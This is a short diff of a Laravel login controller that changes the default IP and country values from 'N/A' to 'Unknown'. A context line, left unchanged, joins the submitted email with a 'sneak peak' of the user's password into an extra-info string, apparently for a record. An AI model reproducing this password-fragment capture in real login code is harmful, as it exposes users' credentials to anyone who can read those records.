@@ -89,8 +89,8 @@ class LoginController extends Controller
         }
         $extra_info = $request->get('email') . ' e password ' . $sneak_peak_password;
         $email = $request->get('email');
-        $ip_address = $request->getClientIp() ?? 'N/A';
-        $ip_country = $request->header('CF-IPCountry', 'N/A');
+        $ip_address = $request->getClientIp() ?? 'Unknown';
+        $ip_country = $request->header('CF-IPCountry', 'Unknown');
 
         // If the class is using the ThrottlesLogins trait, we can automatically throttle
         // the login attempts for this application. We'll key this by the username and
@@ -234,8 +234,8 @@ class LoginController extends Controller
     {
         $uuid = $request->cookie('uuid');
         $response = new Response(view('auth.login'));
-        $ip_address = $request->getClientIp() ?? 'N/A';
-        $ip_country = $request->header('CF-IPCountry', 'N/A');
+        $ip_address = $request->getClientIp() ?? 'Unknown';
+        $ip_country = $request->header('CF-IPCountry', 'Unknown');
         if (empty($uuid) || Str::length($uuid) > 36) {
             $uuid = Str::limit(Str::uuid(), 36, '');
             $response->withCookie(cookie('uuid', $uuid, 525948));
